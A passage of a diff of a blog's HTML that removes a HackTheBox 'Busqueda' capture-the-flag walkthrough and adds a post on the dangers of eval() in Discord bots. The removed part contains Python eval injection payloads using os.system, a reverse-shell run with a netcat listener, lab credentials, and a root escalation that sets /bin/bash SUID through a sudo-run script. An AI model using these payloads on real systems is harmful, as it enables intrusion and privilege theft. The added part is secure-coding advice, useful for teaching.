+</span></span><span class="line"><span class="cl">    <span class="n">user_id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">ctx</span><span class="o">.</span><span class="n">author</span><span class="o">.</span><span class="n">id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">user_id</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span><span class="p">[</span><span class="s2">&#34;users&#34;</span><span class="p">]</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">data</span><span class="p">[</span><span class="s2">&#34;users&#34;</span><span class="p">][</span><span class="n">user_id</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;calculator&#34;</span><span class="p">,</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">    <span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;You don&#39;t own calculator bro.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
 </span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span> <span class="c1"># &lt;&lt;&lt; HERE </span>
-</span></span><span class="line"><span class="cl">            <span class="sa">f</span><span class="s2">&#34;Engine.</span><span class="si">{</span><span class="n">engine</span><span class="si">}</span><span class="s2">.search(&#39;</span><span class="si">{</span><span class="n">query</span><span class="si">}</span><span class="s2">&#39;, copy_url=</span><span class="si">{</span><span class="n">copy</span><span class="si">}</span><span class="s2">, open_web=</span><span class="si">{</span><span class="nb">open</span><span class="si">}</span><span class="s2">)&#34;</span>
-</span></span><span class="line"><span class="cl">        <span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">click</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="n">searchor</span><span class="o">.</span><span class="n">history</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">engine</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">open</span><span class="p">:</span>
-</span></span><span class="line"><span class="cl">            <span class="n">click</span><span class="o">.</span><span class="n">echo</span><span class="p">(</span><span class="s2">&#34;opening browser...&#34;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">	  <span class="o">...</span>
-</span></span></code></pre></div><p>This makes it vulnerable to command injection since the input isn&rsquo;t sanitized. We can use the following payloads for command injection:</p>
-<ul>
-<li><code>__import__('os').system('&lt;CMD&gt;')</code></li>
-<li><code>__import__('os').popen('&lt;CMD&gt;').read()</code></li>
-<li><code>etc</code></li>
-</ul>
-
-
-<h3 class="relative group">PoC &amp; Exploit 
-    <div id="poc--exploit" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#poc--exploit" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<p>I found a nice little exploit for this here: <a href="https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection" target="_blank">Exploit for Searchor 2.4.0 - Arbitrary CMD Injection</a>.</p>
-<p>All I did was clone the repository and run the <code>exploit.sh</code> proof-of-concept script they provided. I ran the following command while also having netcat listening on port 1337.
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">expression</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;The result of `</span><span class="si">{</span><span class="n">expression</span><span class="si">}</span><span class="s2">` is `</span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">`.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error in calculation! :warning:&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>We can even read files on the system like this:
 
     <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241026100435.png" alt="" />
-      
-    </figure>
-</p>
-<p>After the script executes, I see a reverse shell of the user <code>svc</code> pop up in our listener, and we also obtain our <code>user.txt</code> flag.</p>
-<p>
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241026100554.png" alt="" />
+      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241207140642.png" alt="" />
       
     </figure>
 </p>
 
 
-<h1 class="relative group">Privilege Escalation to Root 
-    <div id="privilege-escalation-to-root" class="anchor"></div>
+<h1 class="relative group">Containerization made it somewhat safer 
+    <div id="containerization-made-it-somewhat-safer" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#privilege-escalation-to-root" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#containerization-made-it-somewhat-safer" aria-label="Anchor">#</a>
     </span>        
     
 </h1>
-<p>I looked around the system and found two nice info. At <code>/home/svc</code> there is a folder <code>.gitconfig</code>:</p>
-<pre tabindex="0"><code>svc@busqueda:~$ cat .gitconfig
-cat .gitconfig
-[user]
-	email = cody@searcher.htb
-	name = cody
-[core]
-	hooksPath = no-hooks
-</code></pre><p>I looked around the system and found two interesting pieces of information. In <code>/home/svc</code>, there is a folder named <code>.gitconfig</code>:
+<p>Since we were running the bot in a Docker container, the remote code execution (RCE) was limited to the container and not the main system. However, if the container itself is vulnerable, it could be escaped, leading to a serious security issue. Therefore, it’s crucial to practice both safe coding and secure deployment.</p>
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241026104949.png" alt="" />
-      
-    </figure>
-</p>
-<p>Here, credentials are supplied using the URL scheme to <code>gitea.searcher.htb</code>. I will add this to my <code>/etc/hosts</code> file and then try to access it. I might use the credentials there to find something useful.</p>
-<p>And yes, <code>cody:jh1usoih2bkjaspwe92</code> worked! Yay! However, I didn&rsquo;t find anything useful on the website.</p>
-<p>I performed a random <code>sudo -l</code> check with the credentials above, and since the user is Cody, password reuse must be the case for the user Cody in this situation. And yes! It worked.</p>
-<pre tabindex="0"><code>svc@busqueda:/var/www/app/.git$ sudo -l -S
-[sudo] password for svc: jh1usoih2bkjaspwe92
-Matching Defaults entries for svc on busqueda:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
-    use_pty
 
-User svc may run the following commands on busqueda:
-    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
-</code></pre><p>And we have a possible vector for root as well. However, the fact that we can&rsquo;t read the source code for this file means we are restricted to execute permission here.</p>
-<p>I tried the following test argument, which lets us know the allowed arguments.</p>
-<pre tabindex="0"><code>svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py test
-&lt;usr/bin/python3 /opt/scripts/system-checkup.py test
-Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)
+<h2 class="relative group">Safe Deployment 
+    <div id="safe-deployment" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#safe-deployment" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>For safe deployment of a Discord bot (or any other app) in a Docker container, it&rsquo;s essential to implement strict security controls to minimize potential risks. First, disable root access within the container by ensuring the bot runs as a non-privileged user, which reduces the impact of any exploitation.</p>
+<p>Limit the commands and system calls that can be executed inside the container by using Docker’s security features, such as setting restrictive <code>capabilities</code> and mounting only necessary volumes.</p>
+<p>Additionally, make sure the container’s network access is tightly controlled, preventing any unnecessary exposure to the host or external services. Regularly update the container images to ensure they include the latest security patches, and consider using Docker&rsquo;s built-in features like read-only file systems or limiting container resources to further minimize attack surfaces.</p>
 
-     docker-ps     : List running docker containers
-     docker-inspect : Inpect a certain docker container
-     full-checkup  : Run a full system checkup
-</code></pre><p>Using <code>sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps</code> lists two containers running: <code>gitea</code> and <code>mysql</code>.</p>
-<p>We can probably retrieve some sort of credentials from the MySQL container. We can try using <code>docker inspect</code>.</p>
-<pre tabindex="0"><code>svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
-&lt;thon3 /opt/scripts/system-checkup.py docker-inspect
-Usage: /opt/scripts/system-checkup.py docker-inspect &lt;format&gt; &lt;container_name&gt;
-</code></pre><p>We need the format and the container name in order to inspect the Docker container. We know the container name, but we need the format. I found this: <a href="https://docs.docker.com/engine/cli/formatting/" target="_blank">Docker Formatting Documentation</a>, which explains how the formatting works.</p>
-<p>So I ran the following command (the <code>jq .</code> part is for JSON formatting; learn more about <code>jq</code> <a href="https://jqlang.github.io/jq/" target="_blank">here</a>):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python3 /opt/scripts/system-checkup.py docker-inspect <span class="s1">&#39;{{json .}}&#39;</span> gitea <span class="p">|</span> jq .
-</span></span></code></pre></div><p>I also found the database password here:</p>
-<pre tabindex="0"><code>&#34;Env&#34;: [
-      &#34;USER_UID=115&#34;,
-      &#34;USER_GID=121&#34;,
-      &#34;GITEA__database__DB_TYPE=mysql&#34;,
-      &#34;GITEA__database__HOST=db:3306&#34;,
-      &#34;GITEA__database__NAME=gitea&#34;,
-      &#34;GITEA__database__USER=gitea&#34;,
-      &#34;GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh&#34;,
-      &#34;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;,
-      &#34;USER=git&#34;,
-      &#34;GITEA_CUSTOM=/data/gitea&#34;
-    ]
-</code></pre><p>I&rsquo;m not sure how useful the database password might be, but let&rsquo;s see.<br>
-I want the instance&rsquo;s IP address. For that, I found this formatting on <a href="https://docs.docker.com/reference/cli/docker/inspect/#examples" target="_blank">this site</a>:
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241026110824.png" alt="" />
-      
-    </figure>
-</p>
-<p>I will modify it for my use case like this:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo python3 /opt/scripts/system-checkup.py docker-inspect <span class="s1">&#39;{{json .NetworkSettings.Networks}}&#39;</span> mysql_db <span class="p">|</span> jq .
-</span></span></code></pre></div><p>Which outputs the following:</p>
-<pre tabindex="0"><code>{
-  &#34;docker_gitea&#34;: {
-    &#34;IPAMConfig&#34;: null,
-    &#34;Links&#34;: null,
-    &#34;Aliases&#34;: [
-      &#34;f84a6b33fb5a&#34;,
-      &#34;db&#34;
-    ],
-    &#34;NetworkID&#34;: &#34;cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227&#34;,
-    &#34;EndpointID&#34;: &#34;bf915680ed570128582ba98f8f91606a9941f07c1b0bf344155b9bb360722475&#34;,
-    &#34;Gateway&#34;: &#34;172.19.0.1&#34;,
-    &#34;IPAddress&#34;: &#34;172.19.0.3&#34;,
-    &#34;IPPrefixLen&#34;: 16,
-    &#34;IPv6Gateway&#34;: &#34;&#34;,
-    &#34;GlobalIPv6Address&#34;: &#34;&#34;,
-    &#34;GlobalIPv6PrefixLen&#34;: 0,
-    &#34;MacAddress&#34;: &#34;02:42:ac:13:00:03&#34;,
-    &#34;DriverOpts&#34;: null
-  }
-}
-</code></pre><p>I know the IP address, database username, and database password, so let&rsquo;s try to connect to the MySQL database.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mysql -h 172.19.0.3 -u gitea -pyuiu1hoiu4i5ho1uh gitea
-</span></span></code></pre></div><p>I tried to extract all user information, but it didn&rsquo;t fit properly in the terminal.
+<h1 class="relative group">Secure Coding 
+    <div id="secure-coding" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#secure-coding" aria-label="Anchor">#</a>
+    </span>        
+    
+</h1>
+<p>Do you think safe deployment alone is enough? The answer is a big NO! An attacker can still penetrate and enumerate how the deployment is configured and how the code is written, which makes the asset vulnerable. Therefore, it&rsquo;s crucial to limit how users provide input to further reduce potential risks.</p>
+<p>Input validation and sanitization are essential to ensure that only expected and safe inputs are processed by your code. In the case of our Discord bot, using the <code>eval()</code> function to directly evaluate user-provided input can lead to severe security issues, such as remote code execution (RCE). Even though safe deployment practices can isolate the environment, an attacker can still exploit vulnerabilities in the code. It is crucial to validate and limit the scope of what users can submit, especially when dealing with potentially dangerous functions like <code>eval()</code>.</p>
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241026112027.png" alt="" />
-      
-    </figure>
-</p>
-<p>So I only tried to display interesting information, so I used the query <code>SELECT name, email, passwd FROM user;</code>, which reveals the user&rsquo;s password here.
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241026112219.png" alt="" />
-      
-    </figure>
-</p>
-<p>I tried to crack the password but had no success. After a while, I reused the database password as the administrator&rsquo;s password to see if the admin credentials and database credentials were the same.</p>
-<p>To my surprise, <code>administrator:yuiu1hoiu4i5ho1uh</code> worked, and I am in.</p>
-<p>There is a private repository in the admin profile, which contains the scripts we found in the <code>/opt/scripts</code> directory. Since we now have the source code for these scripts, we may try to use them to exploit the script and gain root access.
+<h3 class="relative group">Fixing the Code to Make It Safer 
+    <div id="fixing-the-code-to-make-it-safer" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#fixing-the-code-to-make-it-safer" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Instead of directly passing user input to <code>eval()</code>, we should <strong>sanitize</strong> and <strong>validate</strong> the input to ensure that it only contains safe mathematical expressions. One way to achieve this is by using libraries like <code>ast.literal_eval()</code> or writing a custom parser for mathematical expressions.</p>
+<p>Here&rsquo;s a safer alternative with input validation:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">discord</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">discord.ext</span> <span class="kn">import</span> <span class="n">commands</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">random</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span> <span class="c1"># Importing Regular Expression used for Validation</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="o">..</span><span class="n">SNIP</span><span class="o">..</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@bot.command</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">calculator</span><span class="p">(</span><span class="n">ctx</span><span class="p">,</span> <span class="o">*</span><span class="p">,</span> <span class="n">expression</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">load_data</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">user_id</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">ctx</span><span class="o">.</span><span class="n">author</span><span class="o">.</span><span class="n">id</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">user_id</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span><span class="p">[</span><span class="s2">&#34;users&#34;</span><span class="p">]</span> <span class="ow">or</span> <span class="ow">not</span> <span class="n">data</span><span class="p">[</span><span class="s2">&#34;users&#34;</span><span class="p">][</span><span class="n">user_id</span><span class="p">]</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;calculator&#34;</span><span class="p">,</span> <span class="kc">False</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;You don&#39;t own calculator bro.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># Validate the input to allow only numbers, operators, and parentheses</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="k">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[0-9+\-*/().\s]*$&#39;</span><span class="p">,</span> <span class="n">expression</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&#34;Invalid input! Only numbers and basic arithmetic operators are allowed.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">expression</span><span class="p">)</span>  <span class="c1"># Safe now since input is validated</span>
+</span></span><span class="line"><span class="cl">        <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;The result of `</span><span class="si">{</span><span class="n">expression</span><span class="si">}</span><span class="s2">` is `</span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">`.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">await</span> <span class="n">ctx</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Error in calculation! :warning:&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DISCORD_TOKEN</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&#34;DISCORD_TOKEN&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">bot</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">DISCORD_TOKEN</span><span class="p">)</span>
+</span></span></code></pre></div>
 
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241026112517.png" alt="" />
-      
-    </figure>
-</p>
-<p>Since we are most interested in <code>system-checkup.py</code>, as the user <code>svc</code> can run it as root, I looked at its source code and found something interesting. The script runs <code>./full-checkup.sh</code> when we supply the argument <code>full-checkup</code>.
-
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241026112840.png" alt="" />
-      
-    </figure>
-</p>
-<p>If we run <code>system-checkup.py</code> with the argument <code>full-checkup</code>, it prints <code>&quot;Something went wrong&quot;</code>.
-
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241026113105.png" alt="" />
-      
-    </figure>
-</p>
-<p>You may ask why. It&rsquo;s because of the <code>try-except</code> block being used. It attempts to run <code>./full-checkup.sh</code>, but since the file isn&rsquo;t present in the current directory from which we are running the script, it fails.</p>
-<p>We can now try to exploit the <code>system-checkup.py</code> script by creating our own <code>full-checkup.sh</code> script in the <code>/tmp</code> directory and running the command from there. In our custom-made script <code>full-checkup.sh</code>, I will essentially make <code>/bin/bash</code> a SUID executable binary so I can easily gain root access.</p>
-<p>I created the following script and granted it execute permission.</p>
-<pre tabindex="0"><code>svc@busqueda:/tmp$ cat full-checkup.sh 
-#!/bin/bash
-
-chmod u+s /bin/bash
-</code></pre><p>Now I will run the following command, and we should have our bash binary set as a SUID executable.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
-</span></span></code></pre></div><p>
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241026114407.png" alt="" />
-      
-    </figure>
-</p>
-<p>We no longer receive the <code>&quot;Something went wrong&quot;</code> error, which means our bash script ran successfully. We should have root access now.
-
-    <figure>
-      <img class="my-0 rounded-md" loading="lazy" src="assets/Pasted%20image%2020241026114647.png" alt="" />
-      
-    </figure>
-</p>
+<h3 class="relative group">Best Practices for Using <code>eval()</code> 
+    <div id="best-practices-for-using-eval" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#best-practices-for-using-eval" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>Using <code>eval()</code> in code can be risky, but if it’s absolutely necessary, there are several steps you can take to minimize the risks. First, you should <strong>limit the scope</strong> in which <code>eval()</code> operates by using the <code>globals</code> and <code>locals</code> parameters. This helps control the environment and prevents access to dangerous functions. For example, you can restrict built-in functions like <code>os.system()</code> from being accessed by passing <code>{&quot;__builtins__&quot;: None}</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="n">expression</span><span class="p">,</span> <span class="p">{</span><span class="s2">&#34;__builtins__&#34;</span><span class="p">:</span> <span class="kc">None</span><span class="p">},</span> <span class="p">{})</span>
+</span></span></code></pre></div><p>Another key practice is <strong>validating</strong> and <strong>sanitizing</strong> user input to ensure that only safe characters and expressions are passed to <code>eval()</code>. This helps avoid malicious code execution. If possible, it’s better to avoid using <code>eval()</code> altogether and consider safer alternatives. For example, you could use libraries like <code>ast.literal_eval()</code> for parsing simple data types or <code>simpleeval</code> for evaluating mathematical expressions, which are far less risky than <code>eval()</code>.</p>
+<p>Additionally, <strong>error handling</strong> is crucial when using <code>eval()</code>. Wrapping the evaluation in a try-except block helps prevent unexpected crashes, handles errors gracefully, and ensures that the error message is not revealed verbosely to the user.</p>
 
 
 <h1 class="relative group">Conclusion 
@@ -1328,7 +1329,8 @@ chmod u+s /bin/bash
     </span>        
     
 </h1>
-<p>Thanks for reading my walkthrough. This box was nice and was part of TJNull&rsquo;s &ldquo;<a href="https://docs.google.com/spreadsheets/u/1/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/htmlview#" target="_blank">NetSecFocus Trophy Room</a>.</p>
+<p>In this blog, we explored the vulnerabilities of the &ldquo;Evil-Bot,&rdquo; a Discord bot, specifically focusing on the security risks posed by the use of the <code>eval()</code> function. By containerizing the bot using Docker, we mitigated the impact of any potential Remote Code Execution (RCE) attacks, as the bot&rsquo;s code was isolated within a secure environment. However, containerization alone is not enough to ensure complete security. It&rsquo;s crucial to adopt secure coding practices, such as validating user input and avoiding dangerous functions like <code>eval()</code>, to prevent malicious exploitation.</p>
+<p>In production environments, isolating applications through containerization is a best practice, but securing the code itself remains paramount. I encourage all developers to adopt safer coding techniques, implement strict input validation, and leverage isolation methods like Docker to protect against vulnerabilities in production bots. By doing so, we can significantly reduce the risks of RCE and create more secure, reliable applications.</p>
 
         </div>
         
@@ -1343,7 +1345,7 @@ chmod u+s /bin/bash
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/writeups/hackthebox/busqueda/&amp;title=Busqueda%20Writeup%20-%20HackTheBox"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/research/learn-how-eval-function-is-evil-for-discord-bots/&amp;title=Why%20You%20Shouldn%27t%20Use%20eval%28%29%20in%20Discord%20Bots%20%28or%20in%20Any%20App%29"
       title="Share on LinkedIn"
       aria-label="Share on LinkedIn"
       >
@@ -1362,7 +1364,7 @@ chmod u+s /bin/bash
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://twitter.com/intent/tweet/?url=http://localhost:1313/writeups/hackthebox/busqueda/&amp;text=Busqueda%20Writeup%20-%20HackTheBox"
+      href="https://twitter.com/intent/tweet/?url=http://localhost:1313/research/learn-how-eval-function-is-evil-for-discord-bots/&amp;text=Why%20You%20Shouldn%27t%20Use%20eval%28%29%20in%20Discord%20Bots%20%28or%20in%20Any%20App%29"
       title="Tweet on Twitter"
       aria-label="Tweet on Twitter"
       >
@@ -1380,7 +1382,7 @@ chmod u+s /bin/bash
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://api.whatsapp.com/send?text=http://localhost:1313/writeups/hackthebox/busqueda/&amp;resubmit=true&amp;title=Busqueda%20Writeup%20-%20HackTheBox"
+      href="https://api.whatsapp.com/send?text=http://localhost:1313/research/learn-how-eval-function-is-evil-for-discord-bots/&amp;resubmit=true&amp;title=Why%20You%20Shouldn%27t%20Use%20eval%28%29%20in%20Discord%20Bots%20%28or%20in%20Any%20App%29"
       title=""
       aria-label=""
       >
@@ -1399,7 +1401,7 @@ chmod u+s /bin/bash
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://t.me/share/url?url=http://localhost:1313/writeups/hackthebox/busqueda/&amp;resubmit=true&amp;title=Busqueda%20Writeup%20-%20HackTheBox"
+      href="https://t.me/share/url?url=http://localhost:1313/research/learn-how-eval-function-is-evil-for-discord-bots/&amp;resubmit=true&amp;title=Why%20You%20Shouldn%27t%20Use%20eval%28%29%20in%20Discord%20Bots%20%28or%20in%20Any%20App%29"
       title=""
       aria-label=""
       >
@@ -1418,7 +1420,7 @@ chmod u+s /bin/bash
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/writeups/hackthebox/busqueda/&amp;description=Busqueda%20Writeup%20-%20HackTheBox"
+      href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/research/learn-how-eval-function-is-evil-for-discord-bots/&amp;description=Why%20You%20Shouldn%27t%20Use%20eval%28%29%20in%20Discord%20Bots%20%28or%20in%20Any%20App%29"
       title="Pin on Pinterest"
       aria-label="Pin on Pinterest"
       >
@@ -1437,7 +1439,7 @@ chmod u+s /bin/bash
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://reddit.com/submit/?url=http://localhost:1313/writeups/hackthebox/busqueda/&amp;resubmit=true&amp;title=Busqueda%20Writeup%20-%20HackTheBox"
+      href="https://reddit.com/submit/?url=http://localhost:1313/research/learn-how-eval-function-is-evil-for-discord-bots/&amp;resubmit=true&amp;title=Why%20You%20Shouldn%27t%20Use%20eval%28%29%20in%20Discord%20Bots%20%28or%20in%20Any%20App%29"
       title="Submit to Reddit"
       aria-label="Submit to Reddit"
       >
@@ -1456,7 +1458,7 @@ chmod u+s /bin/bash
       <a
       target="_blank"
